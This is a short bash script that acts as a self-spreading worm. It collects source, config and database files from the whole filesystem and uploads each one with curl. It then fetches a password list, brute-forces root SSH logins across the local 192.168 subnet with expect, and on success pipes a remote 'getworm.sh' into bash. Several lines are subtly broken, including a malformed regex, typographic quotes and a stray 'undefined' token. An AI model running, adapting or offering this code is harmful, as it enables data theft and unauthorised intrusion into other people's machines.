#!/bin/bash

find / -regex ".*\.java\|.*\.xml|.*\.json|.*\.properties|.*\.cfg|.*\.php|.*\.py|.*\.cs|.*\.txt|.*\.md|.*\.db|.*\.sql" >> filelist.txt

for line in `cat filelist.txt`
do
 if [ -e $line ]
 then
 curl -d "@$line" http://127.0.0.1/upload.php 
 fi
done

localip=$(ifconfig |grep 192.168)

localip=${localip#*192.168.}
localip=${localip%Bcast*}
localipBC=`echo $localip | sed 's/ //g'`

OLD_IFS=”$IFS”
IFS=”.”
localipBC=($localipBC)
IFS=”$OLD_IFS”

curl -O http://secweb.gwm.com/passwdlist.txt

for i in $(seq 1 254);
do
    ip=`echo '192.168.'${localipBC[0]}'.'$i`
    for passwd in `cat passwdlist.txt`
     do
        expect -c "
        spawn ssh root@$ip
        expect {undefined\"*yes/no*\" {send \"yes\r\"; exp_continue}\"*password*\" {send \"$passwd\r\"; exp_continue}\"*Password*\" {send \"$passwd\r\"; exp_continue}\"*implantation*\" {send \"curl -O http://192.168.230.132/getworm.sh|bash\r\";}}"
     done
done
